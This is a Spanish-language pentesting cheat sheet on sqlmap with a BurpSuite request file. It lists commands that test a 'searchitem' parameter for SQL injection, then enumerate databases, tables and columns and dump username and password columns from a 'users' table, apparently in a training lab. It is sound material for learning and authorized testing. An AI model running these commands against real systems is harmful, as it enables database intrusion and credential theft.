# SQL-Map ❮❯

Tags: #Tool #Web #Enumeracion #BurpSuite #SQLI

Podemos usar los archivos de BurpSuite para ingresarlos en la herramienta SQL-Masp y asi nos diga que tipo de vulnerabilidades tiene, ademas de poder obtener datos a paratir de ellas. Para este ejemplo usaremos **SQLI**

```bash
❯ sqlmap -r example.req -p searchitem --batch

	# r = Archivo con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
```

```bash
❯ sqlmap -r example.req -p searchitem --batch --dbs

	# r = File con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
	# dbs = Me muestre todas las bases de datos existentes (Dumpear)
```

Una vez obtenidas las DBs podemos apuntar a las **tablas** de una base especifica

```bash
❯ sqlmap -r example.req -p searchitem --batch -D sqltraining --tables

	# r = File con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
	# D = Le colocamos el nombre de la DB existente 
	# tables = Queremos que nos muestre las tablas de la DB que elegimos 
```

Una vez obtenidas las tablas, ahora vamos a querer que nos enumere las **columnas**

```bash
❯ sqlmap -r example.req -p searchitem --batch -D sqltraining -T users --columns

	# r = File con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
	# D = Le colocamos el nombre de la DB existente 
	# T = Le colocamos el nombre de la tabla existente 
	# columns = Queremos que nos muestre las columnas de la DB que elegimos 
```

Una vez obtenidas las columnas podemos hacer que nos **muestre (Dumpear)** sus valores

```bash
❯ sqlmap -r example.req -p searchitem --batch -D sqltraining -T users -C username,password --dump

	# r = File con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
	# D = Le colocamos el nombre de la DB existente 
	# T = Le colocamos el nombre de la tabla existente 
	# C = Le colocamos el nombre de las columnas existente 
	# dump = Que nos muestre los valores que tienen esas columnas
```

****

